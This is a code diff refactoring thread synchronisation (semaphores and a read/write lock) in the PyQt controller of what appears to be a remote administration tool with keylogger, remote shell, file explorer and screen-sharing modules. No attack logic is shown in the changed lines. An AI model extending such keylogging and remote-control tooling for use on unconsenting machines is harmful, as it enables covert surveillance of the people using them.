@@ -1,3 +1,4 @@
+import InspectionWindowView
 import ScreenShare
 from KeyLog.Keylogger import KeyloggerManager
 from NetProtocol import *
@@ -7,9 +8,27 @@ import functools
 from PyQt5.QtCore import pyqtSignal, QThread, QObject, QRunnable, QThreadPool
 import typing
 from PyQt5.QtWidgets import QTableWidgetItem, QTreeWidgetItem, QTreeWidgetItemIterator
+
+from SocketLock import SocketLock
 from fileExplorerManager import FileExplorerManager
 from RemoteShell.RemoteShell import RemoteShellManager
 
+class SemaphoreSubscriptor:
+    def __init__(self):
+        self.semaphores = []
+
+    def subscribe(self):
+        semaphore = threading.Semaphore(0)
+        self.semaphores.append(semaphore)
+        return semaphore
+
+    def unsubscribe(self, semaphore):
+        if semaphore in self.semaphores:
+            self.semaphores.remove(semaphore)
+
+    def increment_all(self):
+        for semaphore in self.semaphores:
+            semaphore.release()
 
 class TabThreadEventManager(): #container class for the events that tab threads wait for
     def __init__(self, starterindex, *args : threading.Event):
@@ -39,26 +58,43 @@ class TabThreadEventManager(): #container class for the events that tab threads 
 #         time.sleep(10)
 
 class ClientInspectorController(QObject):
-    def requestMetrics(self, client, shownEvent : threading.Event, tabEvent : threading.Event):
-        while shownEvent.wait() and tabEvent.wait():
-            event = client.send_message(NetMessage(NetTypes.NetRequest, NetTypes.NetSystemMetrics), track_event=True)
-            event.wait()
-            time.sleep(0.5)
+    def requestMetrics(self, client):
+        semaphore = self.semaphoreSubscriptor.subscribe()
+        while semaphore.acquire():
+            self.infoLock.acquire_read()
+            active = self.active
+            tab = self.currentTab
+            self.infoLock.release_read()
+            if not active:
+                return
+            elif tab == 0:
+                while True:
+                    self.infoLock.acquire_read()
+                    tab = self.currentTab
+                    self.infoLock.release_read()
+                    if tab != 0:
+                        break
+                    else:
+                        event = client.send_message(NetMessage(NetTypes.NetRequest, NetTypes.NetSystemMetrics), track_event=True)
+                        event.wait()
+                        time.sleep(0.5)
 
-    def __init__(self, view, client):
+
+    def __init__(self, view : InspectionWindowView.ClientInspectorView, client):
         super().__init__()
-        self.tabEventManager = TabThreadEventManager(0, *[threading.Event() for i in range(6)])
+        self.semaphoreSubscriptor = SemaphoreSubscriptor()
+        # self.tabEventManager = TabThreadEventManager(0, *[threading.Event() for i in range(6)])
         self.view = view
         self.client = client
-        self.connected = threading.Event()
-        self.connected.set()
         self.view.connectionInformationTable.initializeClient(client)
-        self.shown = threading.Event()
+        self.infoLock = SocketLock()
+        self.active = True
+        self.currentTab = 0
         self.view.TabContainer.currentChanged.connect(self.tabChanged)
         self.view.pushButton_3.clicked.connect(self.remoteDekstopButtonClicked)
         self.fileExplorerManager = FileExplorerManager(client, self.view)
         self.remoteShellManager = RemoteShellManager(client, self)
-        self.keyloggerManager = KeyloggerManager(client, self.view)
+        self.keyloggerManager = KeyloggerManager(client, self)
         client.dataLock.acquire_read()
 
         # #start the file explorer thread
@@ -75,7 +111,7 @@ class ClientInspectorController(QObject):
         else:
             client.dataLock.release_read()
             self.updateSystemInformation()
-        thread1 = threading.Thread(target=self.requestMetrics, args=(client, self.shown, self.tabEventManager.get_event(0)))
+        thread1 = threading.Thread(target=self.requestMetrics, args=(client,))
         thread1.start()
 
     def startThreads(self):
@@ -87,17 +123,29 @@ class ClientInspectorController(QObject):
         worker.start()
 
     def close(self):
-        if self.shown.is_set():
+        try:
             self.view.close()
-            self.shown.clear()
+        except:pass
+        self.infoLock.acquire_write()
+        self.active = False
+        self.currentTab = -1
+        self.infoLock.release_write()
+        self.semaphoreSubscriptor.increment_all()
 
     def show(self):
-        if not self.shown.is_set():
+        try:
             self.view.show()
-            self.shown.set()
+        except:pass
+        self.infoLock.acquire_write()
+        self.active = True
+        self.infoLock.release_write()
+        self.semaphoreSubscriptor.increment_all()
 
     def tabChanged(self, index):
-        self.tabEventManager.set_event(index)
+        self.infoLock.acquire_write()
+        self.currentTab = index
+        self.infoLock.release_write()
+        self.semaphoreSubscriptor.increment_all()
         if index == 1: #file explorer tab
             if not self.fileExplorerManager.is_initialized():
                 self.fileExplorerManager.initializeContents()
